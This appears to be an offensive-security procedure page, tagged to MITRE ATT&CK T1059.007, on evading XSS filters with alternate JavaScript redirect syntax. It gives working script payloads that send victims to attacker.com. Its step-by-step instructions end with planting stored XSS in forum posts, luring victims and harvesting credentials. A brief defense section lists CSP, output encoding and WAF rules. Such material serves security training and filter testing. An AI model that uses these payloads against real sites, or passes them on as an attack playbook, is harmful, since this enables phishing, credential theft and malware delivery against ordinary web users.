---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter/T1059.007-JavaScript|T1059.007
    - JavaScript]]
sub_techniques: []
tags:
  - xss
  - filter-bypass
  - redirect-bypass
  - cross-site-scripting
commands: []
tools: []
platforms:
  - Web
skill_level: intermediate
impact_level: medium
detection_risk: high
verified: true
validated: true
---

# XSS-Filter-Bypass-via-Alternate-Redirect-Methods

## Summary

This procedure demonstrates how to bypass web application filters designed to block cross-site scripting (XSS) payloads by using alternative JavaScript methods to redirect a victim's browser to a malicious website. By injecting one of several equivalent redirect techniques, an attacker can evade basic string-matching filters that block common 'location.href' patterns, enabling drive-by downloads, phishing, or further exploitation on the target site.

## Description

In a reflected or stored XSS vulnerability, attackers inject JavaScript to execute in the victim's browser. Filters often block direct redirects like 'window.location = "evil.com"' by scanning for keywords such as 'location' or 'href'. This procedure exploits variations in JavaScript's location object and methods—such as direct assignment, document aliases, assign() function, and bracket notation—to achieve the same redirect effect while avoiding filter triggers. This is particularly effective against simplistic WAFs or input sanitizers that don't parse JavaScript semantics deeply. The target environment is typically a web application with an XSS vulnerability, such as insufficient output encoding in user inputs. Success allows the victim to be seamlessly redirected to an attacker-controlled domain for credential harvesting, malware delivery, or command and control initiation. Prerequisites include identifying an injectable parameter (e.g., via query string, form field, or cookie) and confirming the filter blocks standard redirects but allows these alternatives.

## Requirements

1. Identification of an XSS-vulnerable input point on the target website (e.g., search field, comment section).
2. Knowledge of the filter's blocking patterns (test standard redirects first to confirm bypass opportunity).
3. An attacker-controlled domain or URL for the redirect target (e.g., a phishing page).
4. Browser developer tools or a proxy like Burp Suite to test and refine payloads.

## Defense

Defensive measures and detection strategies:

- Implement comprehensive input validation and output encoding (e.g., HTML-encode user inputs) to prevent XSS entirely.
- Deploy Content Security Policy (CSP) with strict directives to block inline scripts and unauthorized redirects (e.g., 'unsafe-inline' disallowed).
- Use advanced WAF rules that parse JavaScript AST (Abstract Syntax Tree) to detect semantic redirects, not just string patterns.
- Enable browser security features like X-XSS-Protection headers and monitor for anomalous redirects via client-side logging.
- Regularly scan for XSS vulnerabilities using tools like OWASP ZAP or Burp Suite Scanner.

## Objectives

1. Inject a JavaScript payload that evades XSS filters to redirect the victim's browser.
2. Successfully navigate the victim to an attacker-controlled malicious website without triggering alerts.
3. Demonstrate multiple bypass variants to adapt to different filter configurations.

## Instructions

### Step 1: Identify the XSS Injection Point and Test Standard Redirect

**Context**: Locate a vulnerable input field or parameter where JavaScript can be reflected back unescaped. Test a basic redirect to confirm the filter blocks it, establishing the need for alternatives.

Inject a simple payload like `<script>window.location='http://test.com'</script>` into the vulnerable field (e.g., via URL parameter ?q=<script>... or form submission). Observe if the redirect occurs or if it's blocked (e.g., no navigation, error logged).

**Expected Output**: If blocked, the page renders without redirecting, and browser console may show no errors or filtered content. If successful (for testing), the browser navigates to test.com.

### Step 2: Select and Inject Alternate Redirect Payload

**Context**: Use one of the alternative JavaScript redirect methods from the code snippet to bypass the filter. These methods achieve the same effect as standard location.href but use different syntax that may evade keyword-based filters.

Reference the code snippet [[codes/JavaScript-Alternate-Redirect-Methods-for-XSS-Bypass]] and choose a variant based on filter testing (e.g., start with direct 'location=' assignment). Wrap in <script> tags and inject into the vulnerable point, replacing 'http://google.com' with your malicious URL (e.g., 'http://attacker.com/phish').

For example, inject: `<script>location="http://attacker.com/phish"</script>`

Test in a browser or proxy to verify evasion.

**Expected Output**: The victim's browser redirects to the target URL without console errors or filter blocks. Network tab shows a 302 or client-side navigation to attacker.com.

### Step 3: Verify and Iterate on Bypass

**Context**: Confirm the redirect works across browsers and refine if needed (e.g., URL-encode the payload or chain with other evasions like case variations).

Submit the payload multiple times, checking for consistency. If one variant fails, try another from the code (e.g., switch to window['location']['href']). Monitor server logs or WAF alerts for detection.

**Expected Output**: Consistent redirects to the malicious site, with no sanitization stripping the script. Success if 80%+ of tests evade the filter.

### Step 4: Deploy in Attack Scenario

**Context**: Once bypassed, integrate into a full exploit (e.g., stored XSS in a forum post) to target multiple victims.

Host the malicious redirect target and lure victims to the vulnerable page. Track redirects via logs on your server.

**Expected Output**: Victim traffic arrives at attacker.com, enabling further actions like credential theft.
